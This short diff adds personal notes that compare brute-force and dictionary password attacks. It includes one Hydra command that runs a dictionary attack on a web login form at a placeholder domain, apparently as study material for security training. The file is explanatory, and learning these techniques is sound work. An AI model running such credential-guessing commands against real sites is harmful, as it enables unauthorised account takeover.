@@ -1,0 +1,12 @@
+BRUTE FORCE VS DICTIONARY ATTACK:
+Pure brute-force attacks mean putting every possible combination. This is TIME CONSUMING.
+compared to
+Dictionary attacks, which have pre-compiled list of words and phrases.
+
+
+
+
+HYDRA FOR WEB LOGIN FORMS:
+hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+
+
